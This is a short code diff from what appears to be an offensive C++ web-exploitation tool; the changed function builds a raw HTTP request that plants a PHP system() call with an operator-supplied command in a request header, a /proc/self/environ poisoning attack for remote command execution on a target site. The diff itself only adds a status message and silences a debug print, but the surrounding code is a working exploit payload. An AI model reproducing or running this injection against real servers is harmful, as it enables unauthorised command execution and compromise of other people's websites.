@@ -776,14 +776,15 @@ void self_environ(string cmd, string owebsite, string path) {
     vector <char> ext;
     vector <char> finalext;
 	hackable = false;
-	
+
+    cout << "[*] Generating request ...\n";	
     msg.resize(0); 
     msg.append("GET "); msg.append(path); 
     msg.append(" HTTP/1.1\r\nHost: "); msg.append(owebsite);
     msg.append("\n\n"); msg.append(getTranslatedPar()); msg.append(": <?php system('");
     msg.append(cmd); msg.append("'); ?>\r\nConnection: close\r\n\r\n");
     req = msg.c_str();
-    cout << msg << endl;
+    //cout << msg << endl;
     general_req(owebsite,req);
     ifile.open("out.txt");
 	
